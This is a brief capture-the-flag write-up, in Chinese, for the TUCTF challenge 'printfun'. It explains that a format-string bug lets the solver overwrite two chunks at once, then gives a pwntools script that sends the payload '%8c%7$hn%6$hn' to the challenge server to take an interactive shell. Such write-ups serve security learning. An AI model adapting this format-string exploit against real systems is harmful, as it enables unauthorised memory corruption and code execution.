### printfun

> [附件](./printfun)

利用fmtstr漏洞同时改掉两个chunk上的内容

[Exploit script:](./pf.py)

```python
from pwn import *
context.log_level='debug'

# p = process('printfun')
p = remote("chal.tuctf.com",30501)

p.recvuntil('? ')
# gdb.attach(p)
p.sendline("%8c%7$hn%6$hn")

p.interactive()
```

